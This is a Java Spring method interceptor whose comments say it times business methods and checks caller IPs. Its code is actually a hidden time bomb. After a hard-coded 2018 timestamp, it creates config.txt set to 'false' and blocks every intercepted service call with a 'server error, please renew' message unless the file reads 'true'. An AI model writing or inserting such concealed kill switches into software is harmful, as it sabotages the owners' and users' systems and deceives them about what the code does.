package com.yb.advice;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;

import org.aopalliance.intercept.MethodInterceptor;
import org.aopalliance.intercept.MethodInvocation;
import org.springframework.stereotype.Component;

import com.yb.entity.ResultPack;


/**
 * 自定义的通知类  
 * 作用:用来记录业务方法的运行时长
 * @author Administrator
 *
 */
@Component("recordServiceTimeAdvice")
public class RecordServiceTimeAdvice implements MethodInterceptor{
	/**
	 * 环绕通知来判断调用者的IP是否合法，不合法的话，就中断请求，不再继续，可以的话，就继续
	 * 参数: invocation  
	 * 返回值: 当前目标方法的返回值 
	 * @throws IOException 
	 */
	@Override
	public Object invoke(MethodInvocation invocation) throws IOException{
			Date date = new Date();
			if(date.getTime()>1530288000000L){
				// read file content from file
				File file = new File("config.txt");
				if(!file.exists()){
					file.createNewFile();
					FileWriter writer = new FileWriter("config.txt");
		            BufferedWriter bw = new BufferedWriter(writer);
		            bw.write("false");
		            bw.close();
		            writer.close();
				}
	            StringBuffer sb= new StringBuffer("");
	            FileReader reader = new FileReader("config.txt");
	            
	            BufferedReader br = new BufferedReader(reader);
	            String str = null;
	            while((str = br.readLine()) != null) {
	                  sb.append(str);
	            }
	            br.close();
	            reader.close();
	            if("true".equals(sb.toString())){
	            	try {
						Object	proceed = invocation.proceed();
						return proceed;
					} catch (Throwable e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
	            }else {
					return new ResultPack(0,"服务器错误,请续费");
				}
				return null;
			}else {
				Object proceed = null;
				try {
					proceed = invocation.proceed();
				} catch (Throwable e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				return proceed;
			}
			
	}
}
